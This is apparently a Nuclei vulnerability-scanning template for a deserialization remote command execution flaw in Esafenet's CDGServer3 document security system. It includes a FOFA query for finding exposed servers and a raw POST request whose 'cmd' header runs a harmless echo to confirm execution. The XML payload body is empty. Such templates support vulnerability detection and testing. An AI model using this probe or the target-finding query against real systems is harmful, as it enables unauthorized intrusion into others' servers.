id: ystdzwdaqglxt-docRenewApp-rce

info:
  name: 亿赛通电子文档安全管理系统 /CDGServer3/docRenewApp 反序列化远程命令执行
  author: HuanXiong
  severity: critical
  description: |-
    fofa: body="CDGServer3" || title="电子文档安全管理系统" || cert="esafenet" || body="/help/getEditionInfo.jsp"
    亿赛通电子文档安全管理系统 /CDGServer3/docRenewApp 接口存在反序列化漏洞，攻击者可通过发送恶意的XML数据包进行反序列化攻击，实现远程命令执行。
  reference:
    - 
  tags: rce, deserialization, esafenet, dzwdaglxt

http:
  - raw:
      - |-
        POST /CDGServer3/docRenewApp HTTP/1.1
        Host: {{Hostname}}
        cmd: echo pboyjnnrfipmplsukdeczudsefxmywe
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.8
        Content-Type: text/xml

        

    matchers:
      - type: dsl
        name: 反序列化远程命令执行
        dsl:
          - "status_code == 200 && contains_all(body, 'pboyjnnrfipmplsukdeczudsefxmywe')"